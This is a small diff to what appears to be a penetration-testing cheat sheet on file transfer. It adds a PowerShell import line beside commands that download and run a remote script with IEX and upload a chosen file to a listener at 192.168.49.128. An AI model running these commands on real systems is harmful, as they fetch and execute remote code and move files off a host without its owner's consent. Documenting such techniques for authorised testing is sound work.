@@ -97,6 +97,7 @@ python3 -m uploadserver
 PowerShell Script to Upload a file
 ```powershell
 IEX(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/juliourena/plaintext/master/Powershell/PSUpload.ps1')
+import-module ./PSUpload.ps1
 Invoke-FileUpload -Uri http://192.168.49.128:8000/upload -File <File_to_upload>
 ```
 Powershell Base64 WebUpload
